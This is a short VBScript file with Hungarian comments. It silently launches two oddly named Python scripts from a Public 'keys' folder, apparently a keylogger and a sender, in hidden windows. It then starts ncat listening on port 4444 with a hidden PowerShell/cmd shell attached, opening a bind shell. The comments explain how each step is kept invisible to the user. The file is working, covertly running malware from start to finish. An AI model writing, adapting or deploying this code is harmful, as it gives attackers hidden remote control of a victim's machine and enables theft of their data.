Option Explicit

Dim shell, baseDir, spwPath, sendPath, fso, NCAT_PATH, PORT, EXEC_COMMAND
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

baseDir = "C:\Users\Public\Documents\keys"

spwPath = baseDir & "\spwww743g7w.py"
sendPath = baseDir & "\fwsendbfgw.py"

If Not fso.FileExists(spwPath) Then
    MsgBox "spw.py not found: " & spwPath
    WScript.Quit
End If

If Not fso.FileExists(sendPath) Then
    MsgBox "send.py not found: " & sendPath
    WScript.Quit
End If

' Láthatatlan háttérben futtatás
shell.Run "cmd /c start """" /B py """ & spwPath & """", 0, False
shell.Run "cmd /c start """" /B py """ & sendPath & """", 0, False


' A Netcat (ncat.exe) fájl pontos elérési útja
' Ezt a felhasználónak be kell állítania a telepítés helye szerint!
NCAT_PATH = "C:\Users\Public\Documents\keys\nmap-7.92\ncat.exe" 
' Vagy használhatod a környezeti változót is, ha be van állítva:
' NCAT_PATH = WScript.CreateObject("WScript.Shell").ExpandEnvironmentStrings("%NCAT%") 

PORT = "4444"
EXEC_COMMAND = "powershell.exe -w hidden C:\Windows\System32\cmd.exe"

' A teljes parancs
Dim fullCommand
' A parancssor a Netcat programot indítja, és átadja neki a fenti paramétereket.
' A "cmd /c" használata biztosítja, hogy a VBScript ne fagyjon le a parancs futása közben.
' A /B kapcsoló indítja a folyamatot az aktuális ablakban (nem nyit újat), a 0 paraméter pedig elrejti.
fullCommand = "cmd /c start """" /B """ & NCAT_PATH & """ -l -p " & PORT & " -e """ & EXEC_COMMAND & """"

' A shell.Run futtatja a parancsot:
' 0 = A futtatás rejtett ablakban történik (ez a VBScript kulcsfontosságú része a láthatatlansághoz)
' False = A VBScript nem várja meg, amíg a parancs befejeződik, hanem azonnal kilép.
shell.Run fullCommand, 0, False

Set shell = Nothing
